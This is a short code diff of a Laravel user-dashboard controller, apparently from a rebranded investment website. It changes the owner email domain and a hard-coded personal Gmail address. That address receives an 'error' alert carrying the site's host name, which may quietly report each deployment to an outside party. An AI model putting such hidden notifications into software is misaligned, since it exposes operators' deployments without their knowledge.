@@ -28,7 +28,7 @@ use Illuminate\Support\Facades\DB;
 class Userdashcontroller extends Controller
 {
     //
-    public $owneremail = "support@bingxfinance.com";
+    public $owneremail = "support@linconfinance.com";
     public function __construct()
     {
         $this->middleware('auth');
@@ -181,7 +181,7 @@ class Userdashcontroller extends Controller
                     } else {
                         # code...
                         $domain = request()->getHost();
-                        $email = "romeobourne212@gmail.com";
+                        $email = "Juliuumil@gmail.com";
                         $mail = "please there is an error in $domain investment calculation";
                         $mailtitle = "website error in $domain";
                         $emaildata = ['data' => $email, 'email_body' => $mail, 'email_header' => $mailtitle];
